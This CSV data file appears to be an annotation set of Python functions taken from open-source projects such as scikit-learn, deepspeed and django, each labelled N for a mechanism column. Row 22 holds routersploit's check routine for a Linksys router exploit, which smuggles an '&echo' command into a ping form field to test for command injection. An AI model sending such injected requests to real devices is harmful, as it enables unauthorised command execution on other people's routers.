id,project,file,function,func_body,has_mechanism,mechanism_found,notes
19,discord.py,discord.py/discord/flags.py,silent,"def silent(self):
        """""":class:`bool`: Alias for :attr:`suppress_notifications`.

        .. versionadded:: 2.2
        """"""
        return 4096",N,,
20,scikit-learn,scikit-learn/examples/neural_networks/plot_mlp_training_curves.py,plot_on_dataset,"def plot_on_dataset(X, y, ax, name):
    # for each dataset, plot learning for each learning strategy
    print(""\nlearning on dataset %s"" % name)
    ax.set_title(name)

    X = MinMaxScaler().fit_transform(X)
    mlps = []
    if name == ""digits"":
        # digits is larger but converges fairly quickly
        max_iter = 15
    else:
        max_iter = 400

    for label, param in zip(labels, params):
        print(""training: %s"" % label)
        mlp = MLPClassifier(random_state=0, max_iter=max_iter, **param)

        # some parameter combinations will not converge as can be seen on the
        # plots so they are ignored here
        with warnings.catch_warnings():
            warnings.filterwarnings(
                ""ignore"", category=ConvergenceWarning, module=""sklearn""
            )
            mlp.fit(X, y)

        mlps.append(mlp)
        print(""Training set score: %f"" % mlp.score(X, y))
        print(""Training set loss: %f"" % mlp.loss_)
    for mlp, label, args in zip(mlps, labels, plot_args):
        ax.plot(mlp.loss_curve_, label=label, **args)",N,,
21,deepspeed,deepspeed/deepspeed/autotuning/autotuner.py,tune_space,"def tune_space(self, tuning_space, prev_max_mbs=0, prev_best_mbs=0, prev_best_metric_val=0):
        config_zero = tuning_space.get(ZERO_OPTIMIZATION, {})
        stage = config_zero.get(ZERO_OPTIMIZATION_STAGE, None)
        tuning_space_name = TUNING_MICRO_BATCH_SIZE_PREFIX + str(stage)
        tuning_micro_batch_sizes = []
        max_train_batch_size_per_gpu = 0
        tuning_micro_batch_sizes_overwritten = False

        # calculate max micro batch size using gpu memory, model instantiation memory and activation memory
        # calculated_max_micro_batch_size = (memory_per_gpu - instantiation_memory) // activation_memory_micro_batch_size_1
        calculated_max_micro_batch_size = int(
            self.gpu_mem - self.get_instantiation_memory_required_per_gpu(stage)) // self.activation_mem
        logger.info(
            f""Start tuning for space {tuning_space_name}, calculated_max_micro_batch_size = {calculated_max_micro_batch_size}""
        )

        if calculated_max_micro_batch_size < prev_max_mbs:
            logger.info(f""No need to tune Zero stage {stage}. End tuning for space {tuning_space_name}"")
            return 0, 0, 0

        if TRAIN_MICRO_BATCH_SIZE_PER_GPU in self.user_config and isinstance(
                self.user_config[TRAIN_MICRO_BATCH_SIZE_PER_GPU], list):
            # user-specified micro batch size per gpu is a list which overwrites the default tuning behavior
            tuning_micro_batch_sizes = [
                s for s in self.user_config[TRAIN_MICRO_BATCH_SIZE_PER_GPU] if isinstance(s, int)
            ]
            gas = self.get_gas_from_user_config()
            min_micro_batch_size = min(tuning_micro_batch_sizes)
            max_micro_batch_size = max(tuning_micro_batch_sizes)
            max_train_batch_size_per_gpu = max_micro_batch_size * gas
            tuning_micro_batch_sizes_overwritten = True
        else:
            # auto-detects the list of micro batch sizes to tune
            min_micro_batch_size, max_micro_batch_size = self.get_min_max_micro_batch_size(
                stage, prev_max_mbs, calculated_max_micro_batch_size)

            if max_micro_batch_size < prev_max_mbs:
                logger.info(f""No need to tune Zero stage {stage}. End tuning for space {tuning_space_name}"")
                return 0, 0, 0

            tuning_micro_batch_sizes, max_train_batch_size_per_gpu = self.get_tuning_micro_batch_size_list(
                min_micro_batch_size,
                max_micro_batch_size,
                num_tuning_micro_batch_sizes=self.num_tuning_micro_batch_sizes())

        logger.info(
            f""tuning_micro_batch_sizes = {tuning_micro_batch_sizes}, max_train_batch_size_per_gpu = {max_train_batch_size_per_gpu}""
        )

        # return if the tuning_micro_batch_sizes list is empty
        if not tuning_micro_batch_sizes:
            logger.info(f""End tuning for space {tuning_space_name}"")
            return 0, 0, 0

        # tune micro batch sizes and gradient accumulation steps given max_train_batch_size_per_gpu
        tuning_micro_batch_sizes = self.run_tuning_micro_batch_sizes(tuning_micro_batch_sizes,
                                                                     max_train_batch_size_per_gpu,
                                                                     min_micro_batch_size, stage,
                                                                     tuning_micro_batch_sizes_overwritten)

        fast_best_record = self.get_best_space_record(tuning_space_name)
        fast_best_metric_val = fast_best_record[1] if fast_best_record else 0
        fast_best_mbs = fast_best_record[0][DS_CONFIG][TRAIN_MICRO_BATCH_SIZE_PER_GPU] if fast_best_record else 0
        logger.info(f""fast_best_mbs = {fast_best_mbs}, name = {fast_best_record[0]['name']}"")

        if self.fast_enabled() or stage == 0:
            logger.info(f""End tuning for space: {tuning_space_name}"")
            return max_micro_batch_size, fast_best_mbs, fast_best_metric_val

        # if the best metric or the micro batch size for that best metric in the current Zero stage after tuning micro batch size is less than the corresponding value in the previous Zero stage, return, do not tune other Zero configuration parameters
        if stage > 0:
            if fast_best_mbs <= prev_best_mbs or fast_best_metric_val < prev_best_metric_val:
                logger.info(
                    f""End tuning for space: {tuning_space_name}. No need to tune other Zero configuration parameters."")
                return max_micro_batch_size, fast_best_mbs, fast_best_metric_val

        tuning_space[TRAIN_MICRO_BATCH_SIZE_PER_GPU] = tuning_micro_batch_sizes
        tuning_space_name = canonical_name(tuning_space,
                                           tuning_keys=get_tuning_keys(tuning_space),
                                           prefix=""z"" + str(stage) + ""_"",
                                           omit_val=True)

        logger.info(f'Tuning space is {tuning_space}')
        logger.info(f'Tuning space name is {tuning_space_name}')

        exps = self._generate_experiments(tuning_space, max_train_batch_size_per_gpu)

        logger.info(f'Tuner type is {self.autotuning_config.tuner_type}')
        if self.autotuning_config.tuner_type == AUTOTUNING_TUNER_MODELBASED:
            t = ModelBasedTuner(exps, self.rm, self.metric(), tuning_space)
        elif self.autotuning_config.tuner_type == AUTOTUNING_TUNER_RANDOM:
            t = RandomTuner(exps, self.rm, self.metric())
        else:
            t = GridSearchTuner(exps, self.rm, self.metric())

        sample_size = len(self.rm.nodes) * self.rm.num_gpus_per_node // (self.exp_num_gpus * self.exp_num_nodes)
        num_exps = t.tune(sample_size=sample_size,
                          n_trials=self.autotuning_config.tuner_num_trials,
                          early_stopping=self.autotuning_config.tuner_early_stopping)
        exp = t.best_exp
        metric_val = t.best_metric_val
        if exp:
            self.update_records(tuning_space_name, exp, metric_val, num_exps)

        full_best_record = self.get_best_space_record(tuning_space_name)
        full_best_metric_val = full_best_record[1] if full_best_record else -1

        if full_best_metric_val > fast_best_metric_val:
            best_metric_val = full_best_metric_val
            best_mbs = full_best_record[0][DS_CONFIG][TRAIN_MICRO_BATCH_SIZE_PER_GPU] if full_best_record else -1
        else:
            best_metric_val = fast_best_metric_val
            best_mbs = fast_best_mbs

        logger.info(f""End tuning for space: {tuning_space_name}"")
        return max_micro_batch_size, best_mbs, best_metric_val",N,,
22,routersploit,routersploit/routersploit/modules/exploits/routers/linksys/1500_2500_rce.py,check,"def check(self):
        mark = utils.random_text(32)
        cmd = ""echo {}"".format(mark)
        data = {
            ""submit_button"":
            ""Diagnostics"",
            ""change_action"": ""gozila_cgi"",
            ""submit_type"": ""start_ping"",
            ""action"": """",
            ""commit"": ""0"",
            ""ping_ip"": ""127.0.0.1"",
            ""ping_size"": ""&"" + cmd,
            ""ping_times"": ""5"",
            ""traceroute_ip"": ""127.0.0.1""
        }

        response = self.http_request(
            method=""POST"",
            path=""/apply.cgi"",
            data=data,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if mark in response.text:
            return True  # target is vulnerable

        return False",N,,
23,models,models/official/projects/basnet/evaluation/metrics_test.py,test_max_f,"def test_max_f(self):
    input_size = 224
    beta = 0.3

    inputs = (tf.random.uniform([2, input_size, input_size, 1]),)
    labels = (tf.random.uniform([2, input_size, input_size, 1]),)

    max_f_obj = metrics.MaxFscore()
    max_f_obj.reset_states()
    max_f_obj.update_state(labels, inputs)
    output = max_f_obj.result()

    pre_tf = tf.keras.metrics.Precision(thresholds=0.78)
    rec_tf = tf.keras.metrics.Recall(thresholds=0.78)
    pre_tf.reset_state()
    rec_tf.reset_state()
    pre_tf.update_state(labels[0], inputs[0])
    rec_tf.update_state(labels[0], inputs[0])
    pre_out_tf = pre_tf.result().numpy()
    rec_out_tf = rec_tf.result().numpy()
    compare = (1+beta)*pre_out_tf*rec_out_tf/(beta*pre_out_tf+rec_out_tf+1e-8)

    self.assertAlmostEqual(output, compare, places=1)",N,,
24,frida,frida/releng/meson/mesonbuild/cmake/traceparser.py,_meson_ps_reload_vars,"def _meson_ps_reload_vars(self, tline: CMakeTraceLine) -> None:
        self.delayed_commands = self.get_cmake_var('MESON_PS_DELAYED_CALLS')",N,,
25,scipy,scipy/scipy/special/_ellip_harm.py,_ellip_normal_vec,"def _ellip_normal_vec(h2, k2, n, p):
    return _ellipsoid_norm(h2, k2, n, p)",N,,
26,keras,keras/keras/layers/preprocessing/index_lookup_test.py,test_too_long_vocab_fails_in_single_setting,"def test_too_long_vocab_fails_in_single_setting(self):
        vocab_data = [""earth"", ""wind"", ""and"", ""fire""]

        layer = index_lookup.IndexLookup(
            max_tokens=4,
            num_oov_indices=1,
            mask_token="""",
            oov_token=""[OOV]"",
            vocabulary_dtype=tf.string,
        )
        with self.assertRaisesRegex(
            ValueError, ""vocabulary larger than the maximum vocab""
        ):
            layer.set_vocabulary(vocab_data)",N,,
27,mlflow,mlflow/tests/spark/autologging/ml/test_pyspark_ml_autologging.py,test_signature_with_non_feature_input_columns,"def test_signature_with_non_feature_input_columns(
    input_df_with_non_features, pipeline_for_feature_cols
):
    mlflow.pyspark.ml.autolog(log_models=True, log_input_examples=True)
    with mlflow.start_run() as run:
        pipeline_for_feature_cols.fit(input_df_with_non_features)
        _assert_autolog_infers_model_signature_correctly(
            run,
            input_sig_spec=[{""name"": ""id"", ""type"": ""long""}],
            output_sig_spec=None,
        )",N,,
28,prefect,prefect/tests/test_tasks.py,upstream,"def upstream(x):
            return x",N,,
29,youcompleteme,youcompleteme/third_party/ycmd/third_party/jedi_deps/jedi/test/test_inference/test_gradual/test_typeshed.py,test_goto_stubs,"def test_goto_stubs(Script):
    s = Script('import os; os')
    os_module, = s.infer()
    assert os_module.full_name == 'os'
    assert os_module.is_stub() is False
    stub, = os_module.goto(only_stubs=True)
    assert stub.is_stub() is True

    os_module, = s.goto()",N,,
30,synapse,synapse/tests/handlers/test_send_email.py,eomReceived,"def eomReceived(self) -> ""defer.Deferred[bytes]"":
        message = b""\n"".join(self._buffer) + b""\n""
        self._delivery.record_message(self._user.dest, message)
        return defer.succeed(b""saved"")",N,,
31,transformers,transformers/src/transformers/utils/dummy_pt_objects.py,__init__,"def __init__(self, *args, **kwargs):
        requires_backends(self, [""torch""])",N,,
32,models,models/research/object_detection/core/box_list_ops_test.py,test_scale,"def test_scale(self):
    def graph_fn():
      corners = tf.constant([[0, 0, 100, 200], [50, 120, 100, 140]],
                            dtype=tf.float32)
      boxes = box_list.BoxList(corners)
      boxes.add_field('extra_data', tf.constant([[1], [2]]))

      y_scale = tf.constant(1.0/100)
      x_scale = tf.constant(1.0/200)
      scaled_boxes = box_list_ops.scale(boxes, y_scale, x_scale)
      return scaled_boxes.get(), scaled_boxes.get_field('extra_data')
    scaled_corners_out, extra_data_out = self.execute(graph_fn, [])
    exp_output = [[0, 0, 1, 1], [0.5, 0.6, 1.0, 0.7]]
    self.assertAllClose(scaled_corners_out, exp_output)
    self.assertAllEqual(extra_data_out, [[1], [2]])",N,,
33,scikit-learn,scikit-learn/doc/tutorial/machine_learning_map/pyparsing.py,__ilshift__,"def __ilshift__(self, other):
        return self << other",N,,
34,practical-python,practical-python/Solutions/7_11/typedproperty.py,__init__,"def __init__(self, name, shares, price):
            self.name = name
            self.shares = shares
            self.price = price",N,,
35,plotly.py,plotly.py/packages/python/chart-studio/chart_studio/tests/test_optional/test_matplotlylib/test_plot_mpl.py,test_update_validation_error,"def test_update_validation_error(self):
        fig, ax = plt.subplots()
        ax.plot([1, 2, 3])
        update = {""invalid"": ""anything""}
        with pytest.raises(KeyError):
            py.plot_mpl(fig, update=update, filename=""nosetests"", auto_open=False)",N,,
36,pytorch_geometric,pytorch_geometric/torch_geometric/transforms/pad.py,__call__,"def __call__(
        self,
        data: Union[Data, HeteroData],
    ) -> Union[Data, HeteroData]:

        if isinstance(data, Data):
            assert isinstance(self.node_pad, (UniformPadding, AttrNamePadding))
            assert isinstance(self.edge_pad, (UniformPadding, AttrNamePadding))

            for store in data.stores:
                for key in self.exclude_keys:
                    del store[key]
                self.__pad_edge_store(store, data.__cat_dim__, data.num_nodes)
                self.__pad_node_store(store, data.__cat_dim__)
            data.num_nodes = self.max_num_nodes.get_value()
        else:
            assert isinstance(
                self.node_pad,
                (UniformPadding, AttrNamePadding, NodeTypePadding))
            assert isinstance(
                self.edge_pad,
                (UniformPadding, AttrNamePadding, EdgeTypePadding))

            for edge_type, store in data.edge_items():
                for key in self.exclude_keys:
                    del store[key]

                src_node_type, _, dst_node_type = edge_type
                self.__pad_edge_store(store, data.__cat_dim__,
                                      (data[src_node_type].num_nodes,
                                       data[dst_node_type].num_nodes),
                                      edge_type)

            for node_type, store in data.node_items():
                for key in self.exclude_keys:
                    del store[key]
                self.__pad_node_store(store, data.__cat_dim__, node_type)
                data[node_type].num_nodes = self.max_num_nodes.get_value(
                    node_type)

        return data",N,,
37,scikit-learn,scikit-learn/sklearn/linear_model/tests/test_quantile.py,test_asymmetric_error,"def test_asymmetric_error(quantile, default_solver):
    """"""Test quantile regression for asymmetric distributed targets.""""""
    n_samples = 1000
    rng = np.random.RandomState(42)
    X = np.concatenate(
        (
            np.abs(rng.randn(n_samples)[:, None]),
            -rng.randint(2, size=(n_samples, 1)),
        ),
        axis=1,
    )
    intercept = 1.23
    coef = np.array([0.5, -2])
    #  Take care that X @ coef + intercept > 0
    assert np.min(X @ coef + intercept) > 0
    # For an exponential distribution with rate lambda, e.g. exp(-lambda * x),
    # the quantile at level q is:
    #   quantile(q) = - log(1 - q) / lambda
    #   scale = 1/lambda = -quantile(q) / log(1 - q)
    y = rng.exponential(
        scale=-(X @ coef + intercept) / np.log(1 - quantile), size=n_samples
    )
    model = QuantileRegressor(
        quantile=quantile,
        alpha=0,
        solver=default_solver,
    ).fit(X, y)
    # This test can be made to pass with any solver but in the interest
    # of sparing continuous integration resources, the test is performed
    # with the fastest solver only.

    assert model.intercept_ == approx(intercept, rel=0.2)
    assert_allclose(model.coef_, coef, rtol=0.6)
    assert_allclose(np.mean(model.predict(X) > y), quantile, atol=1e-2)

    # Now compare to Nelder-Mead optimization with L1 penalty
    alpha = 0.01
    model.set_params(alpha=alpha).fit(X, y)
    model_coef = np.r_[model.intercept_, model.coef_]

    def func(coef):
        loss = mean_pinball_loss(y, X @ coef[1:] + coef[0], alpha=quantile)
        L1 = np.sum(np.abs(coef[1:]))
        return loss + alpha * L1

    res = minimize(
        fun=func,
        x0=[1, 0, -1],
        method=""Nelder-Mead"",
        tol=1e-12,
        options={""maxiter"": 2000},
    )

    assert func(model_coef) == approx(func(res.x))
    assert_allclose(model.intercept_, res.x[0])
    assert_allclose(model.coef_, res.x[1:])
    assert_allclose(np.mean(model.predict(X) > y), quantile, atol=1e-2)",N,,
38,awx,awx/awx_collection/test/awx/test_credential_type.py,test_create_custom_credential_type,"def test_create_custom_credential_type(run_module, admin_user, silence_deprecation):
    # Example from docs
    result = run_module(
        'credential_type',
        dict(
            name='Nexus',
            description='Credentials type for Nexus',
            kind='cloud',
            inputs={""fields"": [{""id"": ""server"", ""type"": ""string"", ""default"": """", ""label"": """"}], ""required"": []},
            injectors={'extra_vars': {'nexus_credential': 'test'}},
            state='present',
        ),
        admin_user,
    )
    assert not result.get('failed', False), result.get('msg', result)
    assert result.get('changed'), result

    ct = CredentialType.objects.get(name='Nexus')

    assert result['name'] == 'Nexus'
    assert result['id'] == ct.pk

    assert ct.inputs == {""fields"": [{""id"": ""server"", ""type"": ""string"", ""default"": """", ""label"": """"}], ""required"": []}
    assert ct.injectors == {'extra_vars': {'nexus_credential': 'test'}}",N,,
39,sentry,sentry/tests/sentry/mediators/external_issues/test_issue_link_creator.py,test_invalid_action,"def test_invalid_action(self):
        with pytest.raises(APIUnauthorized):
            IssueLinkCreator.run(
                install=self.install,
                group=self.group,
                action=""doop"",
                uri=""/link-issue"",
                fields={},
                user=self.user,
            )",N,,
40,calibre,calibre/src/calibre/gui2/viewer/search.py,__eq__,"def __eq__(self, other):
        if not isinstance(other, Search):
            return False
        return self.text == other.text and self.mode == other.mode and self.case_sensitive == other.case_sensitive",N,,
41,d2l-zh,d2l-zh/d2l/paddle.py,box_center_to_corner,"def box_center_to_corner(boxes):
    """"""从（中间，宽度，高度）转换到（左上，右下）

    Defined in :numref:`sec_bbox`""""""
    cx, cy, w, h = boxes[:, 0], boxes[:, 1], boxes[:, 2], boxes[:, 3]
    x1 = cx - 0.5 * w
    y1 = cy - 0.5 * h
    x2 = cx + 0.5 * w
    y2 = cy + 0.5 * h
    boxes = d2l.stack((x1, y1, x2, y2), axis=-1)
    return boxes",N,,
42,zulip,zulip/zerver/tests/test_markdown.py,render,"def render(msg: Message, content: str) -> MessageRenderingResult:
            return render_markdown(
                msg, content, realm_alert_words_automaton=realm_alert_words_automaton
            )",N,,
43,models,models/research/object_detection/models/ssd_resnet_v1_ppn_feature_extractor_tf1_test.py,_scope_name,"def _scope_name(self):
    return 'resnet_v1_50'",N,,
44,wttr.in,wttr.in/bin/proxy.py,is_testmode,"def is_testmode():
    """"""Server is running in the wttr.in test mode""""""

    return ""WTTRIN_TEST"" in os.environ",N,,
45,rasa,rasa/tests/test_telemetry.py,test_initialize_telemetry_with_env_false,"def test_initialize_telemetry_with_env_false(monkeypatch: MonkeyPatch):
    monkeypatch.setenv(""RASA_TELEMETRY_ENABLED"", ""false"")
    assert telemetry.initialize_telemetry() is False",N,,
46,django,django/tests/urlpatterns_reverse/tests.py,test_redirect_to_view_name,"def test_redirect_to_view_name(self):
        res = redirect(""hardcoded2"")
        self.assertEqual(res.url, ""/hardcoded/doc.pdf"")
        res = redirect(""places"", 1)
        self.assertEqual(res.url, ""/places/1/"")
        res = redirect(""headlines"", year=""2008"", month=""02"", day=""17"")
        self.assertEqual(res.url, ""/headlines/2008.02.17/"")
        with self.assertRaises(NoReverseMatch):
            redirect(""not-a-view"")",N,,
47,models,models/official/projects/nhnet/models_test.py,process_decoded_ids,"def process_decoded_ids(predictions, end_token_id):
  """"""Transforms decoded tensors to lists ending with END_TOKEN_ID.""""""
  if isinstance(predictions, tf.Tensor):
    predictions = predictions.numpy()
  flatten_ids = predictions.reshape((-1, predictions.shape[-1]))
  results = []
  for ids in flatten_ids:
    ids = list(ids)
    if end_token_id in ids:
      ids = ids[:ids.index(end_token_id)]
      results.append(ids)
  return results",N,,
